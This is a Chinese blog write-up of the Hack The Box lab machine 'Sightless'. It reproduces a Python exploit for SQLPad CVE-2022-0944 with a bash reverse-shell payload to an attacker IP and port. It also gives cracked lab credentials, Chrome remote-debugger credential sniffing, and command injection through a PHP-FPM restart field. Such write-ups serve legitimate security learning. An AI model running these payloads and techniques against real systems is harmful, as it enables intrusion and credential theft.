<!DOCTYPE html><html class="appearance-auto" lang="en"><head><meta charset="UTF-8"><title>HTB_Sightless</title><meta name="description" content="Buona notte"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.ico"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="nmapnmap 10.10.11.32 -sCV -p 21,22,80
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-28 02:10 EDT
Stats: 0:00:26 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 02:11 (0:00:13 remaining)
Nmap scan report for sightless.htb (10.10.11.32)
Host is up (0.30s latency).

PORT   STATE SERVICE VERSION.."><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Salve" type="application/atom+xml">
</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">HTB_Sightless</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#nmap"><span class="toc-text">nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8-lsof"><span class="toc-text">1. 使用 lsof</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8-netstat"><span class="toc-text">2. 使用 netstat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8-ss"><span class="toc-text">3. 使用 ss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%BD%BF%E7%94%A8-fuser"><span class="toc-text">4. 使用 fuser</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E4%BD%BF%E7%94%A8-pidof-%E5%92%8C-netstat"><span class="toc-text">5. 使用 pidof 和 netstat</span></a></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/HTB"><i class="tag post-item-tag">HTB</i></a><a href="/tags/Chrome%20Remote%20Debugger"><i class="tag post-item-tag">Chrome Remote Debugger</i></a><a href="/tags/sqlpad"><i class="tag post-item-tag">sqlpad</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">HTB_Sightless</h1><time class="has-text-grey" datetime="2024-10-28T06:13:16.000Z">2024-10-28</time><article class="mt-2 post-content"><h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><pre><code>nmap 10.10.11.32 -sCV -p 21,22,80
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-28 02:10 EDT
Stats: 0:00:26 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 02:11 (0:00:13 remaining)
Nmap scan report for sightless.htb (10.10.11.32)
Host is up (0.30s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)                                                               
80/tcp open  http    nginx 1.18.0 (Ubuntu)                                                                                      
|_http-title: Sightless.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=10/28%Time=671F2AFC%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,A0,&quot;220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x2
SF:0Server\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x2
SF:0try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\
SF:x20being\x20more\x20creative\r\n&quot;);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.90 seconds
</code></pre>
<p>开启了ftp，尝试匿名登录看一眼：</p>
<pre><code>└─# ftp 10.10.11.32                   
Connected to 10.10.11.32.
220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
Name (10.10.11.32:root): anonymous
550 SSL/TLS required on the control channel
ftp: Login failed
ftp&gt; exit
221 Goodbye.
</code></pre>
<p>登录不了，看一下网页：</p>
<blockquote>
<p>SQLPad</p>
<p>SQLPad is a web app that lets users connect to various SQL servers via a browser. Click “Start Now” to try a demo!</p>
</blockquote>
<p>我勒个sql，进去看一下，到处点点点，在<code>access</code>下可以看到有一个user：</p>
<blockquote>
<p><a href="mailto:&#106;&#x6f;&#104;&#x6e;&#64;&#115;&#x69;&#x67;&#104;&#x74;&#108;&#101;&#x73;&#115;&#x2e;&#116;&#104;&#x62;">&#106;&#x6f;&#104;&#x6e;&#64;&#115;&#x69;&#x67;&#104;&#x74;&#108;&#101;&#x73;&#115;&#x2e;&#116;&#104;&#x62;</a></p>
</blockquote>
<p>搜索sqlpad的漏洞，只有一个rce：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944/blob/main/exploit.py">sqlpad-rce-exploit-CVE-2022-0944&#x2F;exploit.py at main · 0xRoqeeb&#x2F;sqlpad-rce-exploit-CVE-2022-0944</a></p>
</blockquote>
<pre><code>import argparse
import requests

def main():
   
    parser = argparse.ArgumentParser(description=&quot;CVE-2022-0944 RCE Exploit&quot;)
    parser.add_argument(&#39;root_url&#39;, help=&quot;Root URL of the SQLPad application&quot;)
    parser.add_argument(&#39;attacker_ip&#39;, help=&quot;attacker ip&quot;)
    parser.add_argument(&#39;attacker_port&#39;, help=&quot;attacker port&quot;)
    
    args = parser.parse_args()

    target_url = f&quot;&#123;args.root_url&#125;/api/test-connection&quot;

    payload = f&quot;&#123;&#123;&#123;&#123; process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/&#123;args.attacker_ip&#125;/&#123;args.attacker_port&#125; 0>&1\"') &#125;&#125;&#125;&#125;&quot;

    headers = &#123;
        &#39;Content-Type&#39;: &#39;application/json&#39;,
        &#39;Accept&#39;: &#39;application/json&#39;
    &#125;

    #POST data (JSON body of the request)
    data = &#123;
        &quot;name&quot;: &quot;test&quot;,
        &quot;driver&quot;: &quot;mysql&quot;,
        &quot;data&quot;: &#123;
            &quot;database&quot;: payload
        &#125;,
        &quot;database&quot;: payload
    &#125;

    try:
        response = requests.post(target_url, headers=headers, json=data)
       
        print(f&quot;Response status code: &#123;response.status_code&#125;&quot;)
        print(f&quot;Response body: &#123;response.text&#125;&quot;)

        if response.status_code == 200:
            print(f&quot;Exploit sent successfully. Check your listener on &#123;args.attacker_ip&#125;:&#123;args.attacker_port&#125;&quot;)
        else:
            print(f&quot;Exploit sent, but server responded with status code: &#123;response.status_code&#125;. Check your listener.&quot;)
    except Exception as e:
        print(f&quot;Error: &#123;e&#125;&quot;)

if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<blockquote>
<p>根据代码来看是在创建数据库连接的时候有一个RCE。wp中给的这个网址蛮有意思的：</p>
<p><a target="_blank" rel="noopener" href="https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fbhttps://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb">https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fbhttps://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb</a></p>
<p>有很多外网的博客文章，看起来很不错</p>
</blockquote>
<p>payload : database</p>
<pre><code>&#123;&#123;process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/10.10.16.6/9001 0>&1\"') &#125;&#125;
</code></pre>
<p>如果只填database，会显示连接被拒绝,修改连接的数据库地址为127.0.0.1也显示被拒绝，填本机vpn的ip显示连接失败？这里我们选择换一种反弹方式，通过上传脚本来反弹：</p>
<p>reverse.sh:</p>
<pre><code class="bash">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.6/9001 0&gt;&amp;1&quot;
</code></pre>
<p>不知道为啥，通过下载脚本再运行的脚本这招走不通，只好直接运行脚本成功反弹shell。</p>
<p>很奇怪没有flag，看了下wp是因为在容器里。wp尝试去爆破<code>shadow</code>文件的密码</p>
<p>得到<code>michael:insaneclownposse</code></p>
<p>后面的也不懂，先照着wp学习：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/crisschan/article/details/79970813">设置 Chrome 远程调试端口_–remote-debugging-port&#x3D;9222-CSDN博客</a></p>
<p>[谷歌浏览器远程调试功能 - Rannie&#96; - 博客园](<a target="_blank" rel="noopener" href="https://www.cnblogs.com/kai-/p/15701042.html">https://www.cnblogs.com/kai-/p/15701042.html</a>)</p>
<p>ps -aux看到谷歌开启了远程端口调试</p>
<p><code>ss</code> 是 <code>netstat</code> 的替代工具，速度更快，功能更强大。使用以下命令查看监听端口：</p>
<pre><code>ss -tuln
或者
netstat -tuln
</code></pre>
<p>看见开启了8080</p>
<pre><code>michael@sightless:~$ netstat -tuln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:42075         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:35863         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:32805         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 :::21                   :::*                    LISTEN     
udp        0      0 127.0.0.53:53           0.0.0.0:*                          
udp        0      0 0.0.0.0:68              0.0.0.0:*       
</code></pre>
<p>这里可以使用ssh的端口转发：</p>
<pre><code>ssh -L 8080:127.0.0.1:8080 michael@10.10.11.32
</code></pre>
<p>然后：<a target="_blank" rel="noopener" href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/">Chrome Remote Debugger 渗透测试 |漏洞利用说明</a></p>
<p>这里设置的–remote-debugging-port&#x3D;0，代表使用随机高端口,查看进程所使用的端口：</p>
<blockquote>
<h3 id="1-使用-lsof"><a href="#1-使用-lsof" class="headerlink" title="1. 使用 lsof"></a>1. 使用 <code>lsof</code></h3><p><code>lsof</code>（List Open Files）是一个非常有用的工具，可以列出所有打开的文件及其关联的进程。要查看某个进程占用的端口，使用以下命令：</p>
<pre><code>bash


复制代码
lsof -i -P -n | grep &lt;进程名或PID&gt;
</code></pre>
<p>将 <code>&lt;进程名或PID&gt;</code> 替换为你要检查的进程名称或进程 ID。例如：</p>
<pre><code>bash


复制代码
lsof -i -P -n | grep 1234
</code></pre>
<h3 id="2-使用-netstat"><a href="#2-使用-netstat" class="headerlink" title="2. 使用 netstat"></a>2. 使用 <code>netstat</code></h3><p>可以通过 <code>netstat</code> 命令查看端口与进程之间的映射关系：</p>
<pre><code>bash


复制代码
netstat -tulnp | grep &lt;进程名或PID&gt;
</code></pre>
<ul>
<li><code>-p</code>: 显示进程标识符和程序名称。</li>
<li><code>-n</code>: 以数字形式显示地址和端口号。</li>
</ul>
<h3 id="3-使用-ss"><a href="#3-使用-ss" class="headerlink" title="3. 使用 ss"></a>3. 使用 <code>ss</code></h3><p><code>ss</code> 是 <code>netstat</code> 的替代工具，可以更快地显示 socket 连接信息：</p>
<pre><code>bash


复制代码
ss -tulnp | grep &lt;进程名或PID&gt;
</code></pre>
<h3 id="4-使用-fuser"><a href="#4-使用-fuser" class="headerlink" title="4. 使用 fuser"></a>4. 使用 <code>fuser</code></h3><p><code>fuser</code> 命令可以用来查找占用特定端口的进程：</p>
<pre><code>bash


复制代码
fuser &lt;端口号&gt;/tcp
</code></pre>
<p>例如：</p>
<pre><code>bash


复制代码
fuser 80/tcp
</code></pre>
<h3 id="5-使用-pidof-和-netstat"><a href="#5-使用-pidof-和-netstat" class="headerlink" title="5. 使用 pidof 和 netstat"></a>5. 使用 <code>pidof</code> 和 <code>netstat</code></h3><p>如果你只知道进程名称，可以先找到它的 PID：</p>
<pre><code>bash


复制代码
pidof &lt;进程名&gt;
</code></pre>
<p>然后使用 <code>netstat</code> 或 <code>ss</code> 查看该进程占用的端口：</p>
<pre><code>bash


复制代码
netstat -tulnp | grep &lt;PID&gt;
</code></pre>
<p>或</p>
<pre><code>bash


复制代码
ss -tulnp | grep &lt;PID&gt;
</code></pre>
<p>通过这些方法，你可以找到某个进程占用的端口。</p>
</blockquote>
<p>很奇怪，查不出来</p>
<hr>
<p>&#x3D;&#x3D;这道题后面要利用谷歌浏览器漏洞的漏洞，但kali一直安装不上。由于培训期间不太方便调各种配置以及各种原因考量先暂时不打这个靶机了。&#x3D;&#x3D;</p>
<p>粘贴wp：</p>
<p>首先，在 Michael 的计算机上运行以列出所有活动的网络连接和侦听端口。识别所有打开的端口并转发除只有两位数的端口之外的所有端口。<code>netstat -tnlp</code></p>
<p>使用以下 SSH 命令为每个已识别的端口设置端口转发：</p>
<pre><code>ssh -L 42253:127.0.0.1:42253 michael@10.110.192.10
</code></pre>
<p>将所有相关端口添加到命令中。</p>
<p>接下来，打开 Google Chrome 并导航到 。单击“配置”并将每个端口添加为 ，重复此步骤，直到出现连接。看到连接弹出窗口后，单击“检查”以打开一个新窗口。<code>chrome://inspect/#devices``127.0.0.1:&lt;port_number&gt;</code></p>
<p>在这个新窗口中，切换到“网络”选项卡并等待 Michael 登录。监控流量并找到以查找访问登录门户所需的凭据。使用这些凭证登录。<code>index.php``127.0.0.1:8080</code></p>
<pre><code>admin:ForlorfroxAdmin
</code></pre>
<p>登录后，导航到“PHP”部分，然后转到“PHP-FPM 版本”并创建一个新版本。在 PHP-FPM restart command 字段中，输入以下命令：</p>
<pre><code>cp /root/root.txt /tmp/root.txt
</code></pre>
<p>保存配置，然后转到 。禁用 PHP-FPM 并保存更改，然后重新启用它并再次保存。这将触发 copy 命令的执行。<code>http://127.0.0.1:8080/admin_settings.php?start=phpfpm</code></p>
<p>验证文件是否已复制到 。<code>root.txt``/tmp</code></p>
<p>要继续，请重复相同的过程，但将命令替换为：</p>
<pre><code>chmod 644 /tmp/root.txt
</code></pre>
<p>最后，读入文件的内容以获取必要的信息。<code>root.txt``/tmp</code></p>
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2024/10/28/HTB-CICADA/" title="HTB_CICADA"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: HTB_CICADA</span></a><a class="button is-default" href="/2024/10/26/HTB-EvilCUPS/" title="HTB_EvilCUPS"><span class="has-text-weight-semibold">Next: HTB_EvilCUPS</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="https://github.com/Taninluv/Taninluv.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Taninluv"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Taninluv 2024</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>